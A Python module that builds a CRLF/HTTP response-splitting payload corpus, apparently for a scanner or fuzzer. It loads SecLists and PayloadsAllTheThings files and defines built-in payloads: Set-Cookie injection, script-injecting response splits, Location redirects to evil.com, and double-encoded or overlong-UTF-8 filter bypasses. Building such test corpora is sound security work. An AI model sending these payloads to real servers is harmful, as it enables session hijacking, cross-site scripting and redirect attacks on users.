"""Load and normalize raw CRLF payload corpora."""
from __future__ import annotations

from pathlib import Path


def normalize_payload(line: str) -> str:
    """Strip surrounding whitespace, drop blank lines and pure comments.

    NOTE: we only strip leading/trailing whitespace — interior CRLF control
    bytes and %0d%0a tokens are the payload itself and must be preserved.
    """
    s = line.strip()
    if not s:
        return ""
    if s.startswith("#"):
        return ""
    return s


def load_payloads_from_file(path: Path) -> list[str]:
    out: list[str] = []
    for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        p = normalize_payload(line)
        if p:
            out.append(p)
    return out


def load_payloads_from_dir(root: Path) -> list[str]:
    """Recursively load all .txt payloads under root, deduped, order preserved."""
    root = Path(root)
    seen: set[str] = set()
    out: list[str] = []
    files = sorted(root.rglob("*.txt")) if root.is_dir() else []
    for f in files:
        for p in load_payloads_from_file(f):
            if p not in seen:
                seen.add(p)
                out.append(p)
    return out


# Built-in CRLF / HTTP response injection payloads. Entries that use \r / \n in
# the source are REAL control characters (carriage return / linefeed), modeling
# payloads sent with raw CRLF bytes. The %0d%0a forms are URL-encoded payloads
# that fire when the server URL-decodes the input. Double-encoded (%25...) and
# unicode-overlong (%E5%98%8A) variants bypass single-decode filters.
BUILTIN_PAYLOADS: list[str] = [
    # URL-encoded CRLF + Set-Cookie injection (fires if input is decoded)
    "%0d%0aSet-Cookie:%20evil=1",
    "%0d%0aSet-Cookie:%20session=hijacked",
    "%0D%0ASet-Cookie:%20csrf=bypassed",
    "%0d%0aSet-Cookie: evil=1",
    # Response splitting: double CRLF terminates headers, injects body
    "%0d%0a%0d%0a<html>injected</html>",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E",
    "\n\n<html><script>alert(document.cookie)</script></html>",
    "\r\n\r\nResponse Splitting",
    # Location header injection
    "%0D%0ALocation:%20https://evil.com",
    "\r\nLocation: https://evil.com",
    # Content-Length / Content-Type manipulation
    "%0d%0aContent-Length:%200",
    "%0d%0aContent-Type:%20text/html",
    # Arbitrary injected headers
    "%0d%0aX-Injected:%20true",
    "%0d%0aX-Forwarded-For:%20127.0.0.1",
    "%0d%0aHost:%20evil.com",
    # Raw CRLF control bytes (no URL encoding)
    "\r\nSet-Cookie: evil=1",
    "\nSet-Cookie: evil=1",
    "%0aSet-Cookie: evil=1",
    "%0dSet-Cookie: evil=1",
    # Single-CR / single-LF variants (bypass filters that only block the pair)
    "%0dSet-Cookie:%20evil=1",
    "%0aSet-Cookie:%20evil=1",
    # Double-encoding bypass (defeats url_decode + block_crlf)
    "%250d%250aSet-Cookie:%20evil=1",
    "%25250d%25250aSet-Cookie: evil=1",
    # Unicode overlong UTF-8 encoding of U+000A / U+000D
    "%E5%98%8A%E5%98%8DSet-Cookie: evil=1",
    # Trailing CRLF variants
    "Set-Cookie: evil=1%0d%0a",
    # Benign / negative examples (must NOT fire)
    "test_input",
    "hello_world",
    "normal_value",
]


def load_all_corpora(raw_dir: Path) -> list[str]:
    """Load external corpora if available, plus built-in payloads, deduped."""
    raw_dir = Path(raw_dir)
    seen: set[str] = set()
    out: list[str] = []

    for subdir in ("SecLists", "PayloadsAllTheThings"):
        d = raw_dir / subdir
        if d.is_dir():
            for payload in load_payloads_from_dir(d):
                if payload not in seen:
                    seen.add(payload)
                    out.append(payload)

    for payload in BUILTIN_PAYLOADS:
        if payload not in seen:
            seen.add(payload)
            out.append(payload)

    return out
